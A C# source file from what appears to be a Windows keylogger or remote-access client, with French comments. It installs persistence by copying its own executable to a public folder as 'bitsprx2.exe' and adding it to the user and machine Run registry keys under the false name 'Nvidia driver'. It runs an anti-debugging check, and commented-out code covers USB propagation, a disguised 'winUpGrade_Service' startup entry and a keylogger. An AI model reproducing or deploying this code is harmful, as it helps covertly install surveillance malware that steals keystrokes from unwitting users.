using ClIENT_PC.Persistance;
using ClIENT_PC.Persistance.Propagation;
using ClIENT_PC.Controller;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClIENT_PC.Controller.Installation
{
    class demmarage
    {
        public static string dest = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\winUpGrade_Service.exe";
        public static bool Load()
        {
            if (Parametre.SystemProcess_CheckParentProcess)
                antidebug.CheckParentProcess();
            /*
            if (Mutuelle.VerifierMutex() == false)
                return false;
            */
            //Propagation
            /*
             * usb usbSpread = new usb();
            */

            //Service Google Recherche
            /*
            * urlVulne usbSpread = new urlVulne();
            */
            
            //Ajouter permanentement
            /*
             * try { File.Delete(dest); } catch { }
            try { File.Copy(Application.ExecutablePath, dest); } catch { }
            RegistryKey rCle = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            rCle.SetValue("winUpGrade_Service", dest);
             */
            //Keylogger keylog = new Keylogger();

            sysProtrection sysProc = new sysProtrection();
            return true;
        }
        //AJOUT AU STARTRUP
        public static void Demarage()
        {
            //ESSAYE DE COPIER LE KEYLOGGER DANS UN AUTRE DOSSIER
            string source = Application.ExecutablePath.ToString();
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
            destination = System.IO.Path.Combine(destination, "bitsprx2.exe");
            try
            {
                System.IO.File.Copy(source, destination, false);
                source = destination;
            }
            catch
            {
                Console.WriteLine("Pas autorise pour copier le fichier");
            }
            //Cherche Si il est Deja Au StartUP
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    registryKey.SetValue("Nvidia driver", destination);
                }

                registryKey.Close();//dispose of the Key
            }
            catch
            {
                //  Console.WriteLine("Erreur Parametre.");
            }
            //Essaye Pour tout les utilisateur
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    registryKey.SetValue("Nvidia driver", source);
                }

                registryKey.Close();//dispose of the key
            }
            catch
            {
                Console.WriteLine("Erreur ajout au StartUP pour tout les utilisateur.");
            }
        }
    }
}
